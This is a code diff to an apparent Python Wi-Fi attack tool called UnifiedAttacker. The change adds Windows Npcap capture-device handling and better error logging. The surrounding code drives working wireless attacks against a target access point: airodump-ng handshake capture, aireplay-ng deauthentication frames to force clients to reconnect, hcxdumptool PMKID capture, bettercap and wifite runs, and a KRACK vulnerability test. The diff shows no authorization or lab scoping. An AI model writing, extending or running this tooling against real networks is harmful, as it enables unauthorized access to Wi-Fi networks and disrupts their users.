@@ -17,6 +17,7 @@ from .system import (
     enable_monitor_mode,
     disable_monitor_mode,
     get_hashcat_dir,
+    get_npcap_device_name,
     kill_interfering_processes,
     restart_wlansvc,
 )
@@ -115,6 +116,9 @@ class UnifiedAttacker:
         self._stop = threading.Event()
         self._current_proc: Optional[subprocess.Popen] = None
         self._monitor_iface: Optional[str] = None
+        # Npcap device path for airodump-ng/aireplay-ng on Windows
+        # (e.g. \Device\NPF_{GUID}). Resolved before wlansvc is stopped.
+        self._cap_iface: Optional[str] = None
 
     def stop(self) -> None:
         """Signal the attacker to stop and kill any running subprocess."""
@@ -134,22 +138,47 @@ class UnifiedAttacker:
 
         self._wlansvc_stopped = False
         try:
+            # Resolve the Npcap capture device path BEFORE stopping wlansvc,
+            # because netsh wlan show interfaces needs wlansvc to be running.
+            # airodump-ng / aireplay-ng on Windows require \Device\NPF_{GUID}
+            # — the friendly name ("Wi-Fi") is not accepted by those tools.
+            npcap_dev = get_npcap_device_name(self.interface) if IS_WINDOWS else None
+            if npcap_dev:
+                self._log(f"Npcap capture device: {npcap_dev}", "info")
+            self._cap_iface = npcap_dev or self.interface
+
             # Enable monitor mode FIRST — on Windows, WlanHelper needs the
             # WLAN AutoConfig service (wlansvc) running to talk to the WLAN API.
             # Stopping wlansvc before this call causes myGUIDFromString errors.
             self._log("Enabling monitor mode...", "info")
             ok, result = enable_monitor_mode(self.interface)
             if not ok:
-                self._log(f"Monitor mode failed: {result}", "warn")
-                self._log("Retrying monitor mode...", "info")
-                time.sleep(2)
-                ok, result = enable_monitor_mode(self.interface)
+                # Error code 50 = ERROR_NOT_SUPPORTED — the adapter driver does
+                # not support monitor mode at all; retrying will always fail.
+                if "error code = 50" in result or "not supported" in result.lower():
+                    self._log(f"Monitor mode not supported by this adapter: {result}", "warn")
+                    self._log(
+                        "Adapter driver does not support monitor mode on Windows. "
+                        "For best results use a dedicated USB adapter (e.g. Alfa AWUS036ACH) "
+                        "with Npcap 802.11 monitor mode support.",
+                        "warn",
+                    )
+                else:
+                    self._log(f"Monitor mode failed: {result}", "warn")
+                    self._log("Retrying monitor mode...", "info")
+                    time.sleep(2)
+                    ok, result = enable_monitor_mode(self.interface)
             if ok:
                 self._monitor_iface = result
+                # On Linux the monitor interface (wlan0mon) is the capture iface;
+                # on Windows _cap_iface keeps the Npcap device path.
+                if not IS_WINDOWS:
+                    self._cap_iface = result
                 self._log(f"Monitor mode active: {result}", "success")
             else:
                 self._monitor_iface = self.interface
-                self._log(f"Monitor mode failed: {result}", "warn")
+                if "error code = 50" not in result and "not supported" not in result.lower():
+                    self._log(f"Monitor mode failed: {result}", "warn")
                 self._log("Continuing in managed mode (capture may fail)", "warn")
 
             # NOW stop processes that compete for the adapter during capture.
@@ -302,7 +331,7 @@ class UnifiedAttacker:
                 "--bssid", self.target.bssid,
                 "-w", prefix,
                 "--output-format", "pcap",
-                self._monitor_iface,
+                self._cap_iface,
             ],
             timeout=secs,
         )
@@ -361,7 +390,7 @@ class UnifiedAttacker:
                 from .pcap_utils import capture_pmkid_eapol
                 try:
                     capture_pmkid_eapol(
-                        self._monitor_iface, cap_file,
+                        self._cap_iface, cap_file,
                         bssid_filter=self.target.bssid,
                     )
                 finally:
@@ -382,7 +411,7 @@ class UnifiedAttacker:
 
             self._stream(
                 [
-                    "hcxdumptool", "-i", self._monitor_iface,
+                    "hcxdumptool", "-i", self._cap_iface,
                     "-o", cap_file, "--enable_status=3",
                     f"--filterlist_ap={tmp.name}", "--filtermode=2",
                 ],
@@ -453,10 +482,12 @@ class UnifiedAttacker:
                 "--bssid", self.target.bssid,
                 "-w", prefix,
                 "--output-format", "pcap",
-                self._monitor_iface,
+                self._cap_iface,
             ],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1,
         )
         self._current_proc = cap_proc
 
@@ -465,7 +496,7 @@ class UnifiedAttacker:
         if not self._stop.is_set() and check_tool("aireplay-ng"):
             self._log("Sending deauth frames to force client reconnection...", "info")
             ok, msg = aircrack.deauth(
-                self._monitor_iface, self.target.bssid, count=10
+                self._cap_iface, self.target.bssid, count=10
             )
             self._log(
                 "Deauth sent" if ok else f"Deauth: {msg}",
@@ -481,7 +512,11 @@ class UnifiedAttacker:
 
         cap_proc.terminate()
         try:
-            cap_proc.wait(timeout=5)
+            # Drain remaining output so we can log any airodump-ng errors
+            remaining_out, _ = cap_proc.communicate(timeout=5)
+            for line in (remaining_out or "").splitlines():
+                if line.strip():
+                    self._log(line.strip(), "output")
         except subprocess.TimeoutExpired:
             cap_proc.kill()
         self._current_proc = None
@@ -574,7 +609,7 @@ class UnifiedAttacker:
             f"quit"
         )
         self._stream(
-            ["bettercap", "-iface", self._monitor_iface, "-eval", eval_cmds],
+            ["bettercap", "-iface", self._cap_iface, "-eval", eval_cmds],
             timeout=self.CAPTURE_SECS + 15,
         )
 
@@ -640,7 +675,7 @@ class UnifiedAttacker:
 
         cmd = [
             wifite_tool._find_wifite(),
-            "--interface", self._monitor_iface,
+            "--interface", self._cap_iface,
             "--bssid", self.target.bssid,
             "--channel", str(self.target.channel),
             "--kill",
@@ -733,6 +768,6 @@ class UnifiedAttacker:
         self._log("(Tests whether the AP is vulnerable to CVE-2017-13077+)", "info")
 
         self._stream(
-            [__import__("sys").executable, script, self._monitor_iface, self.target.bssid],
+            [__import__("sys").executable, script, self._cap_iface, self.target.bssid],
             timeout=120,
         )
